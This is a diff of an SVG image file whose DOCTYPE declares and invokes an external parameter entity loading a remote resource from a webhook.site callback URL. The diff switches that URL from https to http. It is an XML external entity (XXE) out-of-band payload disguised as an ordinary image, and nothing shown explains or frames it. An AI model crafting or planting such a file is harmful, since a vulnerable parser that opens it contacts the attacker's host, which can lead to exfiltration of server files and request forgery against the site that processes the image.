@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-<!ENTITY % remote SYSTEM "https://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1">
+<!ENTITY % remote SYSTEM "http://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1">
 %remote;
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
